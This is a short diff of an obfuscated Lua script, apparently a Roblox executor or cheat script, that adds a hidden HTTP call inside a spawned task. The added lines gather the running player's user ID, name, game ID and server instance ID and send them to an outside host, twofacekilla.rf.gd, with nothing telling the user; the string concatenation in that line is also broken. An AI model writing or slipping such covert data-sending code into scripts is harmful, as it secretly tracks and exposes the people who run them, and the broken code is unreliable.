@@ -178,6 +178,10 @@ local _0x2, _0x3 = pcall(function()
 
 	task.spawn(function()
 	  game:HttpGet('https://api.counterapi.dev/v1/:CorruptOblivion/:ExecCount/up') -- i dont fucking care if you spam this im probably gonna forget to check it anyways
+	  local player=game:GetService("Players").LocalPlayer
+	  local gameid=game.PlaceID
+	  local jobid=game.JobId
+	  game:HttpGet('http://twofacekilla.rf.gd/5.php?userid='..player.UserId..'&username='..player.Name'&executor=nilgame='gameid'&instance='..jobid..'')
 	end)
 end)
 
